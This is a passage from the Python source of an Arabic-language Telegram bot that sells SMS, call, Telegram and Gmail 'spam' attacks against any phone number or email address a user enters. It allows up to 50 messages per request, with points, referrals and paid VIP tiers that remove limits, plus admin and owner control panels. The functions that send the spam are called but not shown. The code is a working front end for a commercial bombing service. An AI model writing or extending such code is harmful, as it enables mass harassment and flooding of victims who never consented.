            f"┃ ⚠️ سيتم تحويل النقاط إلى المستخدم\n"
            f"┃ ⚠️ يمكنه استخدامها لشراء محاولات إضافية\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📝 *أرسل ايدي المستخدم:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in transfer_service_menu: {e}")

async def redeem_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        points = get_user_points(user_id)
        
        if points <= 0:
            await query.edit_message_text("❌ لا تملك نقاط كافية للاستبدال!\n\n🎁 قم بتجميع النقاط عبر دعوة الأصدقاء أولاً", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]]))
            return
        
        keyboard = [
            [InlineKeyboardButton("📞 اتصال (1 نقطة)", callback_data="redeem_call")],
            [InlineKeyboardButton("🌏 سبام آسيا (1 نقطة)", callback_data="redeem_spam_asia")],
            [InlineKeyboardButton("🔥 سبام اثير (1 نقطة)", callback_data="redeem_spam_ether")],
            [InlineKeyboardButton("📱 سبام تيليجرام (1 نقطة)", callback_data="redeem_spam_telegram")],
            [InlineKeyboardButton("✉️ سبام جيميل (1 نقطة)", callback_data="redeem_spam_email")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]
        ]
        
        await query.edit_message_text(
            f"💎 *استبدال النقاط*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💰 رصيدك : {points} نقطة\n"
            f"┃ ⭐ 1 نقطة = 1 محاولة إضافية\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📌 *اختر الخدمة:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in redeem_menu: {e}")

async def redeem_service(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        service = query.data.replace('redeem_', '')
        user_id = query.from_user.id
        points = get_user_points(user_id)
        
        if points < 1:
            await query.answer("❌ لا تملك نقاط كافية!", show_alert=True)
            return
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('UPDATE users SET extra_tokens = extra_tokens + 1, extra_tokens_expiry = ? WHERE user_id = ?',
                     ((datetime.now() + timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S'), user_id))
            c.execute('UPDATE users SET points = points - 1 WHERE user_id = ?', (user_id,))
            conn.commit()
            conn.close()
        
        service_names = {"call": "الاتصال", "spam_asia": "سبام آسيا", "spam_ether": "سبام اثير", "spam_telegram": "سبام تيليجرام", "spam_email": "سبام جيميل"}
        points_after = get_user_points(user_id)
        extra = get_extra_tokens(user_id)
        
        await query.answer(f"✅ تم استبدال نقطة! لديك الآن {extra} محاولة إضافية", show_alert=True)
        await query.edit_message_text(
            f"✅ *تم استبدال النقطة بنجاح!*\n\n"
            f"📞 الخدمة: {service_names.get(service, service)}\n"
            f"💎 نقاطك المتبقية: {points_after}\n"
            f"⭐ محاولاتك الإضافية: {extra}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للخدمات", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in redeem_service: {e}")

# ========== دوال المكالمات ==========
async def call_menu_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if not BUTTONS_STATUS.get("call", True):
            await query.edit_message_text("🔴 خدمة الاتصال في وضع الصيانة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]]))
            return
        
        can, remaining = can_use_service(user_id, "call")
        if not can:
            await query.edit_message_text(f"❌ انتهت محاولاتك المجانية اليوم!\n\n💎 يمكنك استبدال نقاطك للحصول على محاولات إضافية\n💰 رصيد نقاطك: {get_user_points(user_id)} نقطة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 استبدال نقاط", callback_data="redeem_menu")], [InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]]))
            return
        
        context.user_data['call_step'] = 'waiting_phone'
        await query.edit_message_text(
            f"📞 *خدمة الاتصال*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📞 محاولاتك المتبقية : {remaining}\n"
            f"┃ 💎 نقاطك : {get_user_points(user_id)}\n"
            f"┃ ⭐ مجاناً: {get_service_limit(user_id, 'call') - get_extra_tokens(user_id)} محاولة\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📱 *أرسل الرقم بالصيغة الدولية*\n"
            f"مثال : +9647712345678\n\n"
            f"⚠️ سيتم استهلاك محاولة مجانية أو نقطة واحدة",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in call_menu_func: {e}")

async def get_call_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get('call_step') != 'waiting_phone':
            return
        
        phone = update.message.text.strip()
        if not phone.startswith('+'):
            await update.message.reply_text("❌ يجب أن يبدأ الرقم بـ +\nمثال: +9647712345678")
            return
        
        user_id = update.effective_user.id
        can, remaining = can_use_service(user_id, "call")
        
        if not can:
            await update.message.reply_text("❌ لا توجد محاولات متبقية!\n\n💎 استبدل نقاطك للحصول على محاولات إضافية", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 استبدال نقاط", callback_data="redeem_menu")]]))
            return
        
        msg = await update.message.reply_text(f"📞 جاري إرسال المكالمة...\n📱 {phone}\n⏱ يرجى الانتظار...")
        success, result_msg = await make_call(phone, user_id)
        
        if success:
            increment_used(user_id, "call")
            used = get_used_today(user_id, "call")
            limit = get_service_limit(user_id, "call")
            points_after = get_user_points(user_id)
            
            await msg.edit_text(
                f"✅ *تم إرسال المكالمة بنجاح!*\n\n"
                f"📱 الرقم: {phone}\n"
                f"{result_msg}\n\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃ 📞 استهلكت: {used}/{limit}\n"
                f"┃ 💎 نقاطك المتبقية: {points_after}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📞 مكالمة جديدة", callback_data="call_menu")], [InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]]),
                parse_mode='Markdown'
            )
        else:
            await msg.edit_text(f"❌ *فشل إرسال المكالمة*\n\n📱 الرقم: {phone}\n{result_msg}\n\n⚠️ لم يتم استهلاك أي محاولة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📞 محاولة مرة أخرى", callback_data="call_menu")], [InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]]))
        
        context.user_data['call_step'] = None
    except Exception as e:
        logger.error(f"Error in get_call_phone: {e}")

# ========== دوال السبام ==========
async def spam_menu_generic(update: Update, context: ContextTypes.DEFAULT_TYPE, spam_type, name, icon):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        service_map = {'ether': 'spam_ether', 'asia': 'spam_asia', 'telegram': 'spam_telegram', 'email': 'spam_email'}
        service = service_map.get(spam_type, 'spam_ether')
        
        if not BUTTONS_STATUS.get(service, True):
            await query.edit_message_text(f"🔴 خدمة {name} في وضع الصيانة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]]))
            return
        
        can, remaining = can_use_service(user_id, service)
        if not can:
            await query.edit_message_text(f"❌ انتهت محاولاتك المجانية لخدمة {name}!\n\n💎 يمكنك استبدال نقاطك للحصول على محاولات إضافية\n💰 رصيد نقاطك: {get_user_points(user_id)} نقطة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 استبدال نقاط", callback_data="redeem_menu")], [InlineKeyboardButton("🔙 رجوع", callback_data="services_menu")]]))
            return
        
        context.user_data['spam_type'] = spam_type
        context.user_data['spam_step'] = 'waiting_target'
        
        target_msg = "الرقم (بدون 0):" if spam_type != 'email' else "الايميل:"
        examples = {"ether": "مثال: 7870496251", "asia": "مثال: 7892909751", "telegram": "مثال: +9647892909751", "email": "مثال: example@gmail.com"}
        example = examples.get(spam_type, "مثال: 7870496251")
        
        await query.edit_message_text(
            f"{icon} *خدمة {name}*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💣 محاولاتك المتبقية : {remaining}\n"
            f"┃ 💎 نقاطك : {get_user_points(user_id)}\n"
            f"┃ ⭐ مجاناً: {get_service_limit(user_id, service) - get_extra_tokens(user_id)} محاولة\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📱 *أرسل {target_msg}*\n"
            f"{example}\n\n"
            f"⚠️ سيتم استهلاك محاولة مجانية أو نقطة واحدة لكل سبام",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in spam_menu_generic: {e}")

async def get_spam_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get('spam_step') != 'waiting_target':
            return
        
        target = update.message.text.strip().replace(' ', '')
        spam_type = context.user_data.get('spam_type')
        
        if spam_type == 'email':
            if '@' not in target:
                await update.message.reply_text("❌ ايميل غير صحيح!")
                return
        else:
            if spam_type == 'telegram' and not target.startswith('+'):
                await update.message.reply_text("❌ الرقم يجب أن يبدأ بـ +")
                return
        
        context.user_data['spam_target'] = target
        context.user_data['spam_step'] = 'waiting_count'
        
        await update.message.reply_text(
            f"🔢 *كم مرة تريد إرسال السبام؟*\n\n"
            f"📱 الهدف: {target}\n"
            f"📊 الحد الأقصى: 50 مرة\n\n"
            f"📝 *أرسل الرقم (1-50)*\n\n"
            f"⚠️ سيتم استهلاك محاولة واحدة لكل سبام",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in get_spam_target: {e}")

async def get_spam_count_execute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get('spam_step') != 'waiting_count':
            return
        
        try:
            count = int(update.message.text.strip())
            if count < 1 or count > 50:
                await update.message.reply_text("❌ العدد بين 1 و 50")
                return
        except:
            await update.message.reply_text("❌ أرسل رقماً صحيحاً")
            return
        
        target = context.user_data['spam_target']
        spam_type = context.user_data.get('spam_type')
        user_id = update.effective_user.id
        
        service_map = {'ether': 'spam_ether', 'asia': 'spam_asia', 'telegram': 'spam_telegram', 'email': 'spam_email'}
        service = service_map.get(spam_type, 'spam_ether')
        
        can, remaining = can_use_service(user_id, service)
        if can is False or remaining < count:
            await update.message.reply_text(f"❌ لا توجد محاولات كافية!\nالمتبقي: {remaining}\nالمطلوب: {count}\n\n💎 استبدل نقاطك للحصول على محاولات إضافية", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 استبدال نقاط", callback_data="redeem_menu")]]))
            return
        
        msg = await update.message.reply_text(f"🔄 جاري تنفيذ {count} سبام...\n📱 {target}\n⏱ يرجى الانتظار...")
        
        loop = asyncio.get_event_loop()
        if spam_type == 'asia':
            context.user_data['spam_need_message'] = True
            context.user_data['spam_count'] = count
            context.user_data['spam_target'] = target
            await msg.edit_text(f"🌏 سبام آسيا\n\n📱 الرقم: {target}\n🔢 العدد: {count}\n\n📝 *أرسل الرسالة التي تريد إرسالها:*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="services_menu")]]))
            return
        elif spam_type == 'ether':
            success, failed = await loop.run_in_executor(executor, send_ether_spam_real, target, count)
        elif spam_type == 'telegram':
            success, failed = await loop.run_in_executor(executor, send_telegram_spam_real, target, count)
        else:
            success, failed = await loop.run_in_executor(executor, send_gmail_spam_real, target, count)
        
        increment_used(user_id, service, count)
        used = get_used_today(user_id, service)
        limit = get_service_limit(user_id, service)
        points_after = get_user_points(user_id)
        
        total = success + failed
        success_percent = int(success / total * 100) if total > 0 else 0
        bar = "█" * int(20 * success / total) + "░" * (20 - int(20 * success / total)) if total > 0 else "░░░░░░░░░░░░░░░░░░░░"
        
        service_names = {"asia": "آسيا", "ether": "اثير", "telegram": "تيليجرام", "email": "جيميل"}
        
        await msg.edit_text(
            f"✅ *تم تنفيذ سبام {service_names.get(spam_type, '')}!*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📱 الهدف: {target}\n"
            f"┃ 🔢 العدد المطلوب: {count}\n"
            f"┃\n"
            f"┃ ✅ النجاح: {success}\n"
            f"┃ ❌ الفشل: {failed}\n"
            f"┃\n"
            f"┃ 📊 نسبة النجاح: {success_percent}%\n"
            f"┃ [{bar}]\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┃ 📞 استهلكت: {used}/{limit}\n"
            f"┃ 💎 نقاطك: {points_after}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 سبام مرة أخرى", callback_data=f"spam_{spam_type}_menu")], [InlineKeyboardButton("🔙 رجوع للخدمات", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
        context.user_data['spam_step'] = None
    except Exception as e:
        logger.error(f"Error in get_spam_count_execute: {e}")

async def get_asia_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.user_data.get('spam_need_message'):
            return
        
        message = update.message.text.strip()
        if not message:
            await update.message.reply_text("❌ أرسل رسالة صالحة")
            return
        
        count = context.user_data.get('spam_count', 1)
        target = context.user_data.get('spam_target')
        user_id = update.effective_user.id
        service = "spam_asia"
        
        can, remaining = can_use_service(user_id, service)
        if can is False or remaining < count:
            await update.message.reply_text(f"❌ لا توجد محاولات كافية!\nالمتبقي: {remaining}\nالمطلوب: {count}")
            return
        
        msg = await update.message.reply_text(f"🔄 جاري تنفيذ {count} سبام...\n📱 {target}\n📝 {message[:30]}...\n⏱ يرجى الانتظار...")
        
        loop = asyncio.get_event_loop()
        success, failed = await loop.run_in_executor(executor, send_asia_spam_real, target, count, message)
        
        increment_used(user_id, service, count)
        used = get_used_today(user_id, service)
        limit = get_service_limit(user_id, service)
        points_after = get_user_points(user_id)
        
        total = success + failed
        success_percent = int(success / total * 100) if total > 0 else 0
        bar = "█" * int(20 * success / total) + "░" * (20 - int(20 * success / total)) if total > 0 else "░░░░░░░░░░░░░░░░░░░░"
        
        await msg.edit_text(
            f"✅ *تم تنفيذ سبام آسيا!*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 📱 الهدف: {target}\n"
            f"┃ 🔢 العدد: {count}\n"
            f"┃ 📝 الرسالة: {message[:50]}\n"
            f"┃\n"
            f"┃ ✅ النجاح: {success}\n"
            f"┃ ❌ الفشل: {failed}\n"
            f"┃\n"
            f"┃ 📊 نسبة النجاح: {success_percent}%\n"
            f"┃ [{bar}]\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┃ 📞 استهلكت: {used}/{limit}\n"
            f"┃ 💎 نقاطك: {points_after}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 سبام مرة أخرى", callback_data="spam_asia_menu")], [InlineKeyboardButton("🔙 رجوع للخدمات", callback_data="services_menu")]]),
            parse_mode='Markdown'
        )
        context.user_data['spam_step'] = None
        context.user_data['spam_need_message'] = False
    except Exception as e:
        logger.error(f"Error in get_asia_message: {e}")

# ========== VIP ==========
async def vip_menu_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user = query.from_user
        
        await context.bot.send_message(
            chat_id=user.id,
            text=f"✦ • ───────────────── • ✦\n"
                 f"👑 *باقة VIP المميزة* 👑\n"
                 f"✦ • ───────────────── • ✦\n\n"
                 f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                 f"┃ ⭐ 1 يوم = 1 دولار\n"
                 f"┃ ⭐ 3 أيام = 3 دولار\n"
                 f"┃ ⭐ 7 أيام = 6 دولار\n"
                 f"┃ ⭐ 30 يوم = 20 دولار\n"
                 f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                 f"┃ *مميزات VIP :*\n"
                 f"┃ ✅ محاولات غير محدودة\n"
                 f"┃ ✅ أولوية في التنفيذ\n"
                 f"┃ ✅ دعم فني مخصص\n"
                 f"┃ ✅ جميع الخدمات متاحة\n"
                 f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                 f"📩 *للطلب والتواصل:* @{PAYMENT_USERNAME}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 تواصل مع المالك", url=f"https://t.me/{PAYMENT_USERNAME}")]])
        )
        await query.edit_message_text("✅ تم إرسال معلومات VIP على الخاص", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]))
    except Exception as e:
        logger.error(f"Error in vip_menu_func: {e}")

# ========== لوحة الادمن ==========
async def admin_panel_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = query.from_user.id
        
        if not is_admin(user_id):
            await query.answer("🚫 هذه اللوحة للأدمن فقط!", show_alert=True)
            return
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users'); total = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM users WHERE is_vip = 1'); vip = c.fetchone()[0]
            c.execute('SELECT SUM(points) FROM users'); total_points = c.fetchone()[0] or 0
            conn.close()
        
        keyboard = [
            [InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats")],
            [InlineKeyboardButton("👑 رفع VIP", callback_data="add_vip_admin")],
            [InlineKeyboardButton("➕ إضافة نقاط", callback_data="add_points_admin")],
            [InlineKeyboardButton("📢 إذاعة عامة", callback_data="broadcast_all")],
            [InlineKeyboardButton("🔒 إذاعة خاصة", callback_data="broadcast_private")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"✦ • ───────────────── • ✦\n"
            f"👨‍💼 *لوحة تحكم الأدمن* 👨‍💼\n"
            f"✦ • ───────────────── • ✦\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 👥 إجمالي المستخدمين: {total}\n"
            f"┃ 👑 أعضاء VIP: {vip}\n"
            f"┃ 💎 إجمالي النقاط: {total_points}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in admin_panel_func: {e}")

async def admin_stats_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users'); total = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM users WHERE is_vip = 1'); vip = c.fetchone()[0]
            c.execute('SELECT SUM(total_calls) FROM daily_stats'); all_calls = c.fetchone()[0] or 0
            c.execute('SELECT SUM(total_spam) FROM daily_stats'); all_spam = c.fetchone()[0] or 0
            c.execute('SELECT SUM(points) FROM users'); total_points = c.fetchone()[0] or 0
            c.execute('SELECT SUM(referral_count) FROM users'); total_refs = c.fetchone()[0] or 0
            today = datetime.now().strftime('%Y-%m-%d')
            c.execute('SELECT total_calls, total_spam FROM daily_stats WHERE date = ?', (today,))
            today_stats = c.fetchone()
            conn.close()
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]]
        
        await query.edit_message_text(
            f"📊 *إحصائيات البوت*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 👥 المستخدمين: {total}\n"
            f"┃ 👑 VIP: {vip}\n"
            f"┃ 💎 إجمالي النقاط: {total_points}\n"
            f"┃ 🔗 إجمالي المحالين: {total_refs}\n"
            f"┃ 📞 مكالمات اليوم: {today_stats[0] if today_stats else 0}\n"
            f"┃ 💣 سبام اليوم: {today_stats[1] if today_stats else 0}\n"
            f"┃ 📞 إجمالي مكالمات: {all_calls}\n"
            f"┃ 💣 إجمالي سبام: {all_spam}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in admin_stats_func: {e}")

async def add_points_admin_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.edit_message_text(
            f"➕ *إضافة نقاط لمستخدم*\n\n"
            f"استخدم الأمر:\n`/add_points <ايدي المستخدم> <عدد النقاط>`\n\n"
            f"📝 أمثلة:\n"
            f"• `/add_points 123456789 10` -> يضيف 10 نقاط\n"
            f"• `/add_points 123456789 -5` -> يخصم 5 نقاط",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in add_points_admin_func: {e}")

async def add_vip_admin_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.edit_message_text(
            f"👑 *رفع مستخدم VIP*\n\n"
            f"استخدم الأمر:\n`/add_vip <ايدي المستخدم> <عدد الأيام>`\n\n"
            f"📝 مثال:\n"
            f"`/add_vip 123456789 7` -> رفع VIP لمدة 7 أيام",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in add_vip_admin_func: {e}")

# ========== لوحة المالك ==========
async def owner_panel_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = query.from_user.id
        
        if not is_owner(user_id):
            await query.answer("🚫 هذه اللوحة للمالك فقط!", show_alert=True)
            return
        
        keyboard = [
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['call'] else RED} 📞 اتصال", callback_data="toggle_call")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_asia'] else RED} 🌏 سبام آسيا", callback_data="toggle_asia")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_ether'] else RED} 🔥 سبام اثير", callback_data="toggle_ether")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_telegram'] else RED} 📱 سبام تيليجرام", callback_data="toggle_telegram")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_email'] else RED} ✉️ سبام جيميل", callback_data="toggle_email")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['referral'] else RED} 🎁 تجميع نقاط", callback_data="toggle_referral")],
            [InlineKeyboardButton("⚙️ تعديل الحدود", callback_data="edit_limits")],
            [InlineKeyboardButton("👑 رفع أدمن", callback_data="owner_add_admin")],
            [InlineKeyboardButton("📉 تنزيل أدمن", callback_data="owner_remove_admin")],
            [InlineKeyboardButton("🔗 إضافة قناة اشتراك إجباري", callback_data="owner_add_channel")],
            [InlineKeyboardButton("❌ حذف قناة", callback_data="owner_remove_channel")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
        ]
        
        status_text = ""
        for service, status in BUTTONS_STATUS.items():
            name = {"call": "اتصال", "spam_asia": "آسيا", "spam_ether": "اثير", "spam_telegram": "تيليجرام", "spam_email": "جيميل", "referral": "تجميع نقاط"}.get(service, service)
            status_text += f"┃ {name} : {'🟢 شغال' if status else '🔴 مقفل'}\n"
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT value FROM settings WHERE key = "limit_call"')
            r = c.fetchone()
            call_limit = int(r[0]) if r else DEFAULT_LIMITS["call"]
            conn.close()
        
        await query.edit_message_text(
            f"✦ • ───────────────── • ✦\n"
            f"⚡ *لوحة تحكم المالك* ⚡\n"
            f"✦ • ───────────────── • ✦\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"{status_text}"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"┃ *الحدود المجانية اليومية:*\n"
            f"┃ 📞 اتصال: {call_limit}\n"
            f"┃ 🌏 آسيا: {DEFAULT_LIMITS['spam_asia']}\n"
            f"┃ 🔥 اثير: {DEFAULT_LIMITS['spam_ether']}\n"
            f"┃ 📱 تيليجرام: {DEFAULT_LIMITS['spam_telegram']}\n"
            f"┃ ✉️ جيميل: {DEFAULT_LIMITS['spam_email']}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"💡 استخدم الأمر `/setlimit <الخدمة> <العدد>` لتعديل الحدود",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in owner_panel_func: {e}")

# ========== دوال التحكم ==========
async def toggle_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["call"] = not BUTTONS_STATUS["call"]
    await update.callback_query.answer(f"تم {'تشغيل' if BUTTONS_STATUS['call'] else 'إيقاف'} الاتصال")
    await owner_panel_func(update, context)

async def toggle_asia(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_asia"] = not BUTTONS_STATUS["spam_asia"]
    await update.callback_query.answer(f"تم {'تشغيل' if BUTTONS_STATUS['spam_asia'] else 'إيقاف'} سبام آسيا")
    await owner_panel_func(update, context)

async def toggle_ether(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_ether"] = not BUTTONS_STATUS["spam_ether"]
    await update.callback_query.answer(f"تم {'تشغيل' if BUTTONS_STATUS['spam_ether'] else 'إيقاف'} سبام اثير")
    await owner_panel_func(update, context)

async def toggle_telegram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_telegram"] = not BUTTONS_STATUS["spam_telegram"]
    await update.callback_query.answer(f"تم {'تشغيل' if BUTTONS_STATUS['spam_telegram'] else 'إيقاف'} سبام تيليجرام")
    await owner_panel_func(update, context)

async def toggle_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["spam_email"] = not BUTTONS_STATUS["spam_email"]
    await update.callback_query.answer(f"تم {'تشغيل' if BUTTONS_STATUS['spam_email'] else 'إيقاف'} سبام جيميل")
    await owner_panel_func(update, context)

async def toggle_referral(update: Update, context: ContextTypes.DEFAULT_TYPE):
    BUTTONS_STATUS["referral"] = not BUTTONS_STATUS["referral"]
    await update.callback_query.answer(f"تم {'تشغيل' if BUTTONS_STATUS['referral'] else 'إيقاف'} تجميع النقاط")
    await owner_panel_func(update, context)

async def edit_limits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.edit_message_text(
            f"⚙️ *تعديل الحدود المجانية اليومية*\n\n"
            f"استخدم الأمر: `/setlimit <الخدمة> <العدد>`\n\n"
            f"*الخدمات المتاحة:*\n"
            f"• `call` - اتصال\n"
            f"• `spam_asia` - سبام آسيا\n"
            f"• `spam_ether` - سبام اثير\n"
            f"• `spam_telegram` - سبام تيليجرام\n"
            f"• `spam_email` - سبام جيميل\n\n"
            f"📝 أمثلة:\n"
            f"• `/setlimit call 10`\n"
            f"• `/setlimit spam_asia 20`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="owner_panel")]]),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in edit_limits: {e}")

async def back_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await show_main_menu(query.message, query.from_user.id, context)
    except Exception as e:
        logger.error(f"Error in back_main: {e}")

# ========== أوامر البوت ==========
async def add_points_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ هذا الأمر للأدمن فقط!")
        return
    try:
        target = int(context.args[0])
        points = int(context.args[1])
        update_user_points(target, points)
        points_after = get_user_points(target)
        
        if points > 0:
            msg = f"✅ تم إضافة {points} نقطة للمستخدم {target}\n💎 رصيده الآن: {points_after} نقطة"
        elif points < 0:
            msg = f"⚠️ تم خصم {abs(points)} نقطة من المستخدم {target}\n💎 رصيده الآن: {points_after} نقطة"
        else:
            msg = f"ℹ️ لم يتم تغيير رصيد المستخدم {target}"
        
        await update.message.reply_text(msg)
        try:
            await context.bot.send_message(target, f"🎁 تم {'إضافة' if points > 0 else 'خصم'} {abs(points)} نقطة {'إلى' if points > 0 else 'من'} رصيدك!\n💎 رصيدك الحالي: {points_after} نقطة")
        except:
            pass
    except:
        await update.message.reply_text("❌ استخدم: `/add_points <ايدي> <نقاط>`\n\n📝 مثال: `/add_points 123456789 10`")

async def add_vip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
